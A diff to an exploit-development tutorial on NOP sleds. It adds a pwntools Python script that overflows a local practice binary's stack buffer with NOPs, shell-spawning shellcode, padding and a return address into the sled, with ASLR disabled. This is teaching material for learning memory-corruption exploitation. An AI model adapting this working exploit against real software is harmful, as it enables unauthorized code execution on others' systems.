@@ -12,12 +12,29 @@ In intel x86 assembly, NOP instructions are `\x90`.
 
 We can make slight changes to our exploit to do two things:
 
-* Pad our shellcode from the left with NOPs
+* Add a large number of NOPs on the left
 * Adjust our return pointer to point at the middle of the NOPs rather than the buffer start
 
 > Make sure ASLR is still disabled. If you have to disable it again, you may have to readjust your previous exploit as the buffer location my be different.
 
 ```python
+from pwn import *
 
+context.binary = ELF('./vuln')
+
+p = process()
+
+payload = b'\x90' * 240                 # The NOPs
+payload += asm(shellcraft.sh())         # The shellcode
+payload = payload.ljust(312, b'A')      # Padding
+payload += p32(0xffffcfb4 + 120)        # Address of the buffer + half nop length
+
+log.info(p.clean())
+
+p.sendline(payload)
+
+p.interactive()
 ```
+
+> It's probably worth mentioning that shellcode with NOPs is not failsafe; if you receive unexpected errors padding with NOPs but the shellcode worked before, try reducing the length of the nopsled
 
